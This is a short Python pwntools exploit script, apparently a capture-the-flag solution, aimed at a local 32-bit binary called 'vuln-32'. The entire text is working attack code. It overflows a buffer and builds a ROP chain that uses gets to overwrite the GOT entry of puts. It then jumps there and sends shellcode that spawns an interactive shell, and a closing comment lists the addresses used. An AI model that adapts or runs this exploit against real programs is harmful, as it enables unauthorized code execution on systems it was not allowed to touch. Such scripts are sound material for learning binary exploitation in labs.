#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF('./vuln-32')
p = process()

rop = ROP(elf)

rop.raw('A' * 32)
rop.gets(elf.got['puts'])      # Call gets, writing to the GOT entry of puts
rop.raw(elf.got['puts'])       # now our shellcode is written there, we can continue execution from there

p.recvline()
p.sendline(rop.chain())

p.sendline(asm(shellcraft.sh()))

p.interactive()

"""
0\x90\x04\x08 gets plt
\x1e\x90\x04\x08 og return addr
\x10\xc0\x04\x08 puts got 
\x10\xc0\x04\x08 puts got
"""
